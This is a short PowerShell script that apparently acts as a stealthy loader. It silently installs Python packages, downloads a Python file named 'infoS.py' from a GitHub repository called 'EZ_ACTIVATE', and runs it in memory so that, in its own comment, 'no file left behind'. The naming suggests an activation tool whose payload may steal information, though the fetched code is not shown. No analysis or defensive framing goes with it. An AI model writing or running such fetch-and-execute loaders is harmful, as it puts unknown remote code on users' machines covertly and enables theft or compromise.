# Check if Python exists (exit silently if not)
try { $null = python --version 2>&1 } catch { exit }

# Install required modules (silently)
$deps = "requests", "pywin32", "pypiwin32"
foreach ($pkg in $deps) { pip install --quiet --upgrade $pkg --disable-pip-version-check }

# Download & run script (no file left behind)
$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
$script = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
python -c $script
